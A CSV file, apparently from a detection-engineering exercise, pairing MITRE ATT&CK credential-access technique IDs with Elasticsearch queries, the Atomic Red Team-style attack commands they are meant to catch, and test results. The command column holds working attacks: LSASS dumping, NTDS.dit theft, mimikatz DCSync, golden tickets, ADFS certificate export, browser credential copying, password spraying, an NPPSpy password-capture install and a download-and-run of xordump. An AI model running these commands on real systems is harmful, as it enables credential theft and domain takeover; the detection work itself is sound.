T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""AADInternals*""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSCertificates""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}},
                        {""match_phrase"": {""CommandLine"": ""Where-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module AADInternals -Force; 
Export-AADIntADFSCertificates; 
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}; 
Write-Host ""`nCertificates retrieved successfully""",2,
T1552.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*ActiveDirectory*""}},
                        {""wildcard"": {""CommandLine"": ""*AADInternals*""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ADObject""}},
                        {""match_phrase"": {""CommandLine"": ""System.Management.Automation.PSCredential""}},
                        {""match_phrase"": {""CommandLine"": ""Get-AADIntADUserNTHash""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSConfiguration""}},
                        {""wildcard"": {""CommandLine"": ""*ServiceSettingsData.PolicyStore.DkmSettings*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""[System.DirectoryServices.DirectorySearcher]""}},
                        {""match_phrase"": {""CommandLine"": ""Export-AADIntADFSCertificates""}},
                        {""match_phrase"": {""CommandLine"": ""ConvertTo-SecureString""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ChildItem""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Import-Module ActiveDirectory -Force ; 
Import-Module AADInternals -Force | Out-Null; 
$dcServerName = (Get-ADDomainController).HostName; 
$svc = Get-ADObject -filter * -Properties objectguid,objectsid | Where-Object name -eq ""#{adfs_service_account_name}""; 
$PWord = ConvertTo-SecureString -String ""#{replication_password}"" -AsPlainText -Force; 
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList;
$hash = Get-AADIntADUserNTHash -ObjectGuid $svc.ObjectGuid -Credentials $Credential -Server $dcServerName -AsHex; 
$ADFSConfig = Export-AADIntADFSConfiguration -Hash $hash -SID $svc.Objectsid.Value -Server; $Configuration = [xml]$ADFSConfig; 
$group = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.Group; 
$container = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ContainerName; 
$parent = $Configuration.ServiceSettingsData.PolicyStore.DkmSettings.ParentContainerDn; 
$base = ""LDAP://CN=$group,$container,$parent""; 
$ADSearch = [System.DirectoryServices.DirectorySearcher]::new([System.DirectoryServices.DirectoryEntry]::new($base)); $ADSearch.Filter = '(name=CryptoPolicy)'; 
$ADSearch.PropertiesToLoad.Clear(); 
$ADSearch.PropertiesToLoad.Add(""displayName"") | Out-Null; 
$aduser = $ADSearch.FindOne(); 
$keyObjectGuid = $ADUser.Properties[""displayName""] ; 
$ADSearch.PropertiesToLoad.Clear(); 
$ADSearch.PropertiesToLoad.Add(""thumbnailphoto"") | Out-Null; 
$ADSearch.Filter=""(l=$keyObjectGuid)""; 
$aduser=$ADSearch.FindOne() ; 
$key=[byte[]]$aduser.Properties[""thumbnailphoto""][0] ; 
Export-AADIntADFSCertificates -Configuration $ADFSConfig -Key $key; 
Get-ChildItem | Where-Object {$_ -like ""ADFS*""}; 
Write-Host ""`nCertificates retrieved successfully""",2,
T1555.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                        {""match"": {""CommandLine"": ""Destination""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"":{""CommandLine"": ""Chrome\\User Data\\Default\\Login Data""}},
                        {""match_phrase"":{""CommandLine"": ""Opera Stable\\Login Data""}},
                        {""match_phrase"":{""CommandLine"": ""Firefox\\Profiles""}},
                        {""match_phrase"":{""CommandLine"": ""Microsoft\\Edge\\User Data\\Default""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"" -Destination $env:temp; 
Copy-Item ""$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account"" -Destination $env:temp

Copy-Item ""$env:APPDATA\Opera Software\Opera Stable\Login Data"" -Destination $env:temp

Copy-Item ""$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"" -Destination $env:temp\Edge -Force -Recurse

Copy-Item ""$env:APPDATA\Mozilla\Firefox\Profiles\"" -Destination $env:temp -Force -Recurse",2,
T1555.004,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must_not"":[
                        {""match"": {""CommandLine"": ""/all""}}
                    ]
     }
    },
    {""bool"":{
     ""must"":[
                                        {""wildcard"":{""CommandLine"": ""vaultcmd*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","vaultcmd /listcreds:""Windows Credentials""",2,
T1552.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""type*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Panther\\unattend.xml""}},
                        {""match_phrase"": {""CommandLine"": ""Panther\\Unattend\\unattend.xml""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","type C:\Windows\Panther\unattend.xml 
&& type C:\Windows\Panther\Unattend\unattend.xml",2,
T1110.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""System.DirectoryServices.Protocols*""}},
                        {""match_phrase"":{""CommandLine"": ""Get-Content -Path""}},
                        {""match"":{""CommandLine"": ""foreach""}},
                        {""match"":{""CommandLine"": ""try""}},
                        {""wildcard"":{""CommandLine"": ""*.bind""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""Write-Host""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if (""NTLM"".ToLower() -NotIn @(""ntlm"",""kerberos"")) {;
   Write-Host ""Only 'NTLM' and 'Kerberos' auth methods are supported"";
   exit 1; }; 
[System.Reflection.Assembly]::LoadWithPartialName(""System.DirectoryServices.Protocols"") | Out-Null; 
$di = new-object System.DirectoryServices.Protocols.LdapDirectoryIdentifier(""$env:UserDnsDomain"",389); $passwordList = Get-Content -Path 5cb955_passwords.txt; 
foreach ($password in $passwordList){;
   $credz = new-object System.Net.NetworkCredential(""$ENV:USERNAME"", $password, ""$env:UserDnsDomain"");
   $conn = new-object System.DirectoryServices.Protocols.LdapConnection($di, $credz, [System.DirectoryServices.Protocols.AuthType]::NTLM);
   try {;
     Write-Host "" [-] Attempting ${password} on account $ENV:USERNAME."";
     $conn.bind();
     Write-Host "" [!] $ENV:USERNAME:${password} are valid credentials!"";
   } catch {;
     Write-Host $_.Exception.Message;
   };
 };
 Write-Host ""End of bruteforce""",2,
T1110.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""net use""}},
                        {""wildcard"": {""CommandLine"": ""*IPC""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""wildcard"": {""CommandLine"": ""FOR*""}},
                        {""wildcard"": {""CommandLine"": ""user*""}},
                        {""wildcard"": {""CommandLine"": ""echo*""}}
      ],
       ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo Password1> passwords.txt 
&& echo 1q2w3e4r>> passwords.txt 
&& echo Password!>> passwords.txt 
&& echo Spring2022>> passwords.txt 
&& echo ChangeMe!>> passwords.txt 
&& @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\#{user}"" ""%p"" 1>NUL 2>&1 
&& @echo [*] #{user}:%p 
&& @net use /delete %logonserver%\IPC$ > NUL",2,
T1003.005,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""cmdkey /list""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}",cmdkey /list,2,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""match_phrase"": {""CommandLine"": ""C:\\Windows\\Temp""}},
                    {""match"": {""CommandLine"": ""copy""}},
                    {""wildcard"": {""CommandLine"": ""*NTDS.dit""}},
                    {""match_phrase"": {""CommandLine"": ""reg save""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","if not exist C:\Windows\Temp  ( call ) ELSE ( mkdir C:\Windows\Temp ) &&   
&&  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit 
&& copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Windows\Temp\VSC_SYSTEM_HIVE 
&& reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE",2（被45识别）,
T1558.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""rubeus.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""klist purge""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content -Path""}},
                        {""match_phrase"": {""CommandLine"": ""ForEach-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Out-File""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""username*""}},
                        {""wildcard"": {""CommandLine"": ""logonserver*""}},
                        {""wildcard"": {""CommandLine"": ""userdnsdomain*""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; 
cmd.exe /c ""$Env:temp\rubeus.exe"" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"") /printcmd /outfile:golden; 
$filename = (Get-ChildItem | ? {$_.Name.startswith(""golden_"")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name;
@""; >%TEMP%\golden.txt 2>&1 (;
   echo Purge existing tickets and create golden ticket:;
   klist purge;
   cd %temp%;
   ""$Env:temp\rubeus.exe"" ptt /ticket:kirbifile;
   echo.;
   echo Requesting SYSVOL:;
   dir \\$($ENV:logonserver.TrimStart('\') + ""."" + ""$ENV:userdnsdomain"")\SYSVOL;   ;
   echo.;
   echo Tickets after requesting SYSVOL:;
   klist;
   echo.;
   echo End of Golden Ticket attack; );""
@ -Replace ""kirbifile"", $filename | Out-File -Encoding OEM $env:TEMP\golden.bat; 
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null; 
do {;
   Start-Sleep 1;
   Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {;
     if ($_ -match 'End of Golden Ticket attack') { break } ;
   };
} while ($false); 
Get-Content $env:TEMP\golden.txt; 
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore",2,
T1558.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""Security.Principal.NTAccount""}},
                        {""match_phrase"": {""CommandLine"": ""mimikatz.exe""}},
                        {""wildcard"": {""CommandLine"": ""*.txt""}},
                        {""match_phrase"": {""CommandLine"": ""klist purge""}},
                        {""match_phrase"": {""CommandLine"": ""Get-Content -Path""}},
                        {""match_phrase"": {""CommandLine"": ""ForEach-Object""}},
                        {""match_phrase"": {""CommandLine"": ""Out-File""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""*userdnsdomain*""}},
                        {""match_phrase"": {""CommandLine"": ""Remove-Item""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore; 
$domain_sid = ""S-1-5-21-DEFAULT""; 
If ($domain_sid -Match ""DEFAULT"") {;
   $domain = gwmi Win32_ComputerSystem | Select -Expand Domain;
   $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;
   $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'));
}; 
@""; >%TEMP%\golden.txt 2>&1 (;
   echo Purge existing tickets and create golden ticket:;
   klist purge;
   $env:TEMP\mimikatz\x64\mimikatz.exe ""kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt"" ""exit"";
   echo.;
   echo Requesting SYSVOL:;
   dir \\%userdnsdomain%\SYSVOL;   ;
   echo.;
   echo Tickets after requesting SYSVOL:;
   klist;
   echo.;
   echo End of Golden Ticket attack; 
); ""
@ -Replace ""DOMAIN_SID"", $domain_sid | Out-File -Encoding OEM $env:TEMP\golden.bat; 
echo ""foo"" | runas /netonly /user:fake ""$env:TEMP\golden.bat"" | Out-Null; 
do {;
   Start-Sleep 1;
   Get-Content -Path ""$env:TEMP\golden.txt"" -Wait | ForEach-Object {;
     if ($_ -match 'End of Golden Ticket attack') { break } ;
   }; 
} while ($false); 
Get-Content $env:TEMP\golden.txt; 
Remove-Item $env:TEMP\golden.bat -ErrorAction Ignore; 
Remove-Item $env:TEMP\golden.txt -ErrorAction Ignore",2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""procdump*""}},
                    {""match_phrase"": {""CommandLine"": ""lsass.exe""}},
                    {""wildcard"": {""CommandLine"": ""*.dmp""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -mm lsass.exe C:\Windows\Temp\lsass_dump.dmp

PathToAtomicsFolder\T1003.001\bin\procdump.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass_dump.dmp",没日志,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""should"": [
                    {""wildcard"": {""CommandLine"": ""vssadmin*""}},
                    {""match_phrase"": {""CommandLine"": ""create shadow""}},
                    {""wildcard"": {""CommandLine"": ""mklink*""}}
            ],
            ""minimum_should_match"": 2
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","vssadmin.exe create shadow /for=C: 
&& mklink /D C:\Temp\vssstore \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1

(Available only for Win7)",2,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""wmic*""}},
                    {""match_phrase"": {""CommandLine"": ""process call create""}},
                    {""wildcard"": {""CommandLine"": ""esentutl*""}},
                    {""wildcard"": {""CommandLine"": ""*ntds.dit""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /node:""localhost"" process call create ""cmd.exe /c esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\ntds.dit""",2（被53识别）,
T1003.003,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""wmic*""}},
                    {""match_phrase"": {""CommandLine"": ""shadowcopy call create""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","wmic /node:""localhost"" shadowcopy call create Volume=C:\

wmic shadowcopy call create Volume=C:\",2(被53识别）,
T1003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""match_phrase"": {""CommandLine"": ""NPPSPY.dll""}},
                        {""match_phrase"": {""CommandLine"": ""Get-ItemProperty -Path""}},
                        {""match_phrase"": {""CommandLine"": ""Control\\NetworkProvider\\Order""}},
                        {""match_phrase"": {""CommandLine"": ""Set-ItemProperty -Path""}},
                        {""match_phrase"": {""CommandLine"": ""New-Item -Path""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""Copy-Item""}},
                        {""match_phrase"": {""CommandLine"": ""-PropertyType ExpandString""}},
                        {""match_phrase"": {""CommandLine"": ""CurrentControlSet\\Services\\NPPSpy""}}
      ],
            ""minimum_should_match"": 2
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","Copy-Item ""$env:Temp\NPPSPY.dll"" -Destination ""C:\Windows\System32""; 
$path = Get-ItemProperty -Path ""HKLM:\SYSTEM\CurrentControlSet\Control\NetworkProvider\Order"" -Name PROVIDERORDER; 
$UpdatedValue = $Path.PROVIDERORDER + "",NPPSpy""; 
Set-ItemProperty -Path $Path.PSPath -Name ""PROVIDERORDER"" -Value $UpdatedValue; 
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy -ErrorAction Ignore; 
$rv = New-Item -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Class"" -Value 2 -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""Name"" -Value NPPSpy -ErrorAction Ignore; 
$rv = New-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\NPPSpy\NetworkProvider -Name ""ProviderPath"" -PropertyType ExpandString -Value ""%SystemRoot%\System32\NPPSPY.dll"" -ErrorAction Ignore; 
echo ""[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\NPPSpy.txt""",2,
T1552.002,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""reg*""}},
                          {""wildcard"": {""CommandLine"": ""REG_SZ""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""query HKCU""}},
                        {""match_phrase"": {""CommandLine"": ""query HKLM""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","reg query HKCU /f password /t REG_SZ /s

reg query HKLM /f password /t REG_SZ /s
  
reg query HKCU\Software\SimonTatham\PuTTY\Sessions /t REG_SZ /s",2,
T1003.006,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""mimikatz*""}},
                        {""wildcard"": {""CommandLine"": ""lsadump*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""domain*""}},
                        {""wildcard"": {""CommandLine"": ""user*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","%tmp%\mimikatz\x64\mimikatz.exe ""lsadump::dcsync /domain:%userdnsdomain% /user:krbtgt@%userdnsdomain%"" ""exit""",2,
T1003.003,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""ntdsutil*""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""match_phrase"": {""CommandLine"": ""ac i ntds""}},
                        {""match_phrase"": {""CommandLine"": ""\""ifm\""""}},
                        {""match_phrase"": {""CommandLine"": ""create full""}},
                        {""wildcard"": {""CommandLine"": ""snapshot*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","mkdir C:\Windows\Temp\ntds_T1003 
&& ntdsutil ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ntds_T1003"" q q",2,
T1003.001,"{
    ""query"": {
        ""bool"": {
            ""must"": [
                    {""wildcard"": {""CommandLine"": ""createdump*""}},
                    {""match_phrase"": {""CommandLine"": ""tasklist | findstr""}},
                    {""wildcard"": {""CommandLine"": ""lsass*""}}
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","echo ""Createdump Path C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe""; $LSASS = tasklist | findstr ""lsass""; 
$FIELDS = $LSASS -split ""\s+""; 
$ID = $FIELDS[1]; 
& ""C:\Program Files\dotnet\shared\Microsoft.NETCore.App\5.*.*\createdump.exe"" -u -f C:\Windows\Temp\dotnet-lsass.dmp $ID",2,
T1003.001,"{
    ""query"": {
        ""bool"": {       
            ""must"": [
                {""bool"":{
     ""must"":[
                        {""wildcard"": {""CommandLine"": ""*.dmp""}}
                    ]
     }
    },
    {""bool"":{
     ""should"":[
                        {""wildcard"": {""CommandLine"": ""nanodump*""}},
                        {""wildcard"": {""CommandLine"": ""xordump*""}}
      ]
     }
    }
            ]
        }
    },
    ""sort"": {""@timestamp"": {""order"": ""desc"" }}
}","%temp%\nanodump.x64.exe -w ""%temp%\nanodump.dmp""

if (Test-Path 'C:\Windows\Temp\xordump.exe') { ;
 } else {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; 
Invoke-WebRequest ""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"" -OutFile C:\Windows\Temp\xordump.exe};  ;  
C:\Windows\Temp\xordump.exe -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41",2,
